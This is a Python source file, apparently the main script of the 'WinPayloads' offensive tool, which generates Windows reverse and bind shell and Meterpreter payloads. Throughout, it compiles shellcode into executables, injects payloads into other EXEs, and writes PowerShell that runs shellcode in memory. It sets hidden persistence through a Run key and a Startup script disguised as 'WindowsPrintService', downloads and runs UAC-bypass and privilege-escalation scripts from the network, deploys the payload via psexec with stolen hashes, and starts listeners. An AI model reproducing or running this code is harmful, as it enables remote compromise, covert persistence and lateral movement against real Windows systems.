#!/usr/bin/python
from main import *


if not re.search('winpayloads',os.getcwd().lower()):
    print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
    sys.exit(1)

try:
    iperror = False
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 0))
    IP = s.getsockname()[0]
except:
    iperror = True

payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n' , ''

try:
    os.mkdir(payloaddir)
except OSError:
    pass

print t.clear
print '=' * t.width + t.bold_red
print " _       ___       ____              __                __".center(t.width)
print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
print "   /____/".center(t.width)
print t.normal + '=' * t.width


try:
    print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
           t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
    print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
    print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
    print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
           t.bold_red + ' [not working]').center(t.width - 30) + t.normal
    print '=' * t.width

    while True:
        menuchoice = raw_input('> ')
        if menuchoice == '1':
            payloadchoice = SHELLCODE.windows_rev_shell
            payload = 'Windows Reverse Shell'
            break
        elif menuchoice == '2':
            payloadchoice = SHELLCODE.windows_met_rev_shell
            payload = 'Windows Meterpreter Reverse Shell'
            break
        elif menuchoice == '3':
            payloadchoice = SHELLCODE.windows_met_bind_shell
            payload = 'Windows Meterpreter Bind Shell'
            break
        elif menuchoice == '4':
            payloadchoice = SHELLCODE.windows_met_rev_https_shell
            payload = 'Windows Meterpreter Reverse HTTPS '
            break
        else:
            print t.bold_red + '[*] Wrong Selection' + t.normal

    print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal

    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
        portnum = raw_input(
            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
        if iperror == False:
            ipaddr = raw_input(
                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
            if len(ipaddr) is 0:
                ipaddr = IP
        else:
            print t.bold_red + 'Error Getting Ip Automatically'
            ipaddr = raw_input(
                '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')

        if len(portnum) is 0:
            portnum = 4444
        print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
        try:
            ip1, ip2, ip3, ip4 = ipaddr.split('.')
            iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        try:
            porthex = struct.pack('>h', int(portnum))
            porthex2 = struct.pack('>h', int(portnum) + 1)
        except:
            print t.bold_red + '[*] Error in Port Syntax'
            sys.exit(1)
        if menuchoice == '4':
            shellcode = payloadchoice % (porthex, iphex)
            shellcode2 = payloadchoice % (porthex2, iphex)
            print "using https"
        else:
            shellcode = payloadchoice % (iphex, porthex)
            shellcode2 = payloadchoice % (iphex, porthex2)
    elif menuchoice == '3':
        bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
        if len(bindport) is 0:
            bindport = 4444
        try:
            bindporthex = struct.pack('>h', int(bindport))
            bindporthex2 = struct.pack('>h', int(bindport) + 1)
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        shellcode = payloadchoice % (bindporthex)
        shellcode2 = payloadchoice % (bindporthex2)

    if menuchoice == '2' or menuchoice == '3':
        want_UACBYPASS = raw_input(
            t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
            want_ALLCHECKS = raw_input(
                t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '' and want_ALLCHECKS.lower() == 'n' or want_ALLCHECKS.lower() == '':
            want_PERSISTENCE = raw_input(
                t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)

    for byte in shellcode:
        ez2read_shellcode += '\\x%s' % byte.encode('hex')
        count = 0
        newpayloadlayout = ''
        for char in ez2read_shellcode:
            count += 1
            newpayloadlayout += char
            if count == 4:
                newpayloadlayout += ','
                count = 0

    if want_UACBYPASS.lower() == 'y':
        for byte in shellcode2:
            ez2read_shellcode2 += '\\x%s' % byte.encode('hex')
            count = 0
            newpayloadlayout = ''
            for char in ez2read_shellcode2:
                count += 1
                newpayloadlayout += char
                if count == 4:
                    newpayloadlayout += ','
                    count = 0

    persistencelayout = re.sub(r'\\x', '0x', newpayloadlayout).rstrip(',')
    persistencesleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
        persistencelayout)
    persistencenosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
        persistencelayout)
    persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""

    if want_PERSISTENCE.lower() == 'y':
        with open('persist.ps1', 'w') as persistfile:
            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
            persistfile.close()
        with open('persist.rc', 'w') as persistfilerc:
            persistfilerc.write(persistencerc)
            persistfilerc.close()

    want_to_payloadinexe = raw_input(
        t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)

    if menuchoice == '2' or menuchoice == '3':
        if want_UACBYPASS.lower() == 'y':
            uacbypassrcfilecontents = """run post/windows/manage/migrate SESSION=1 NAME=explorer.exe SPAWN=false KILL=false\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
            uacbypassrcfilecontents2 = """run post/windows/manage/migrate SESSION=2 NAME=spoolsv.exe SPAWN=false KILL=false\nrun post/windows/escalate/getsystem SESSION=2"""
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
                base64.b64encode(persistencenosleep.encode('utf_16_le')))
            with open('bypassuac.ps1', 'w') as uacbypassfile:
                uacbypassfile.write(uacbypassfilecontent)
                uacbypassfile.close()
            with open('uacbypass.rc', 'w') as uacbypassfilerc:
                uacbypassfilerc.write(uacbypassrcfilecontents)
                uacbypassfilerc.close()
            with open('uacbypass2.rc', 'w') as uacbypassfilerc2:
                uacbypassfilerc2.write(uacbypassrcfilecontents2)
                uacbypassfilerc2.close()

    if want_ALLCHECKS.lower() == 'y':
        with open('allchecks.ps1', 'w') as allchecksfile:
            allchecksfile.write(
                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
            allchecksfile.close()

    if not want_to_payloadinexe == 'y':
        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
            Filesave.close()

        print '[*] Creating Payload using Pyinstaller...'

        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print '[*] Cleaning Up...'
        if menuchoice == '1':
            payloadname = 'ReverseStagelessShell.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '2':
            payloadname = 'ReverseWindowsMeterpreter.exe'
            if re.search(payloadname,subprocess.check_output(['ls', '-la', '/etc/winpayloads'])):
                payloadname = payloadname + "1"
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '3':
            payloadname = 'BindWindowsMeterpreter.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '4':
            payloadname = 'ReverseHTTPSWindowsMeterpreter.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        else:
            os.system('mv %s/dist/payload.exe %s/payload.exe' %
                      (payloaddir, payloaddir))

        os.system('rm %s/logdict*' % os.getcwd())
        os.system('rm %s/dist -r' % payloaddir)
        os.system('rm %s/build -r' % payloaddir)
        os.system('rm %s/*.spec' % payloaddir)
        os.system('rm %s/payload.py' % payloaddir)
        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' %(payloaddir, payloadname) + t.normal

    if want_to_payloadinexe.lower() == 'y':
        payloadinexe_payloadname = raw_input(
            t.bold_green + '[*] EXE Filepath or URL to EXE: ' + t.normal)
        os.chdir(os.getcwd() + '/shellter')
        try:
            os.mkdir('compiled')
        except:
            pass
        with open('payloadbin', 'wb') as Csave:
            Csave.write(shellcode)
            Csave.close()
        payloadinexe_payloadnameshort = re.search('\w+\.exe$', payloadinexe_payloadname)
        if re.search('(http:\/\/|https:\/\/)',payloadinexe_payloadname):
            os.system('wget ' + payloadinexe_payloadname)
            payloadinexe_payloadname = payloadinexe_payloadnameshort.group(0)
        os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
                  payloadinexe_payloadname)
        os.system('mv %s ./compiled/%s' %
                  (payloadinexe_payloadname, payloadinexe_payloadnameshort.group(0)))
        try:
            os.system('rm ' + payloadinexe_payloadnameshort.group(0))
            os.system('rm ' + payloadinexe_payloadnameshort.group(0) + '.bak')
            os.system('rm payloadbin')
        except:
            pass

    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'y' or want_to_upload == '':
        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
            a = multiprocessing.Process(
                target=FUNCTIONS().ServePayload, args=(os.getcwd() + '/compiled',))
            a.daemon = True
            a.start()
        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s"% (IP,payloadname) + t.normal
            a = multiprocessing.Process(
                target=FUNCTIONS().ServePayload, args=(payloaddir,))
            a.daemon = True
            a.start()

    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        while True:
            targethash = raw_input(
                '[*] Targets NT:LM Hash or Plain Text Password:')
            targetusername = raw_input('[*] Targets Username:')
            targetdomain = raw_input('[*] Targets Domain:')
            targetipaddr = raw_input('[*] Targets Ip Address:')
            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
            ispsexecdetailscorrect = raw_input(
                '[*] Are These Details Correct? ([y]/n)')
            if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
                if re.search(':', targethash):
                    print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
                    targetpassword = ''
                else:
                    print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
                    targetpassword = targethash
                    targethash = None
                break
            else:
                continue
        b = multiprocessing.Process(
            target=FUNCTIONS().ServePsexec, args=(payloaddir + '/' + payloadname, targethash, targetusername, targetdomain, targetipaddr, targetpassword))
        b.daemon = True
        b.start()


    if menuchoice == '1':
        os.system('nc -lvp %s' % portnum)
    elif menuchoice == '2':
        if want_UACBYPASS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (portnum, int(portnum) + 1))
        elif want_ALLCHECKS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
        elif want_PERSISTENCE.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
        else:
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
    elif menuchoice == '3':
        bindip = raw_input(
            '\n[*] Enter Target Ip Address \n[*] IP> ')
        if want_UACBYPASS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
        elif want_ALLCHECKS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
        elif want_PERSISTENCE.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
        else:
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
    elif menuchoice == '4':
        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)

    print t.bold_green + '[*] Cleaning Up\n' + t.normal
    subprocess.call(['rm *.rc'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.call(['rm *.ps1'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sys.exit(0)
except KeyboardInterrupt:
    sys.exit(1)
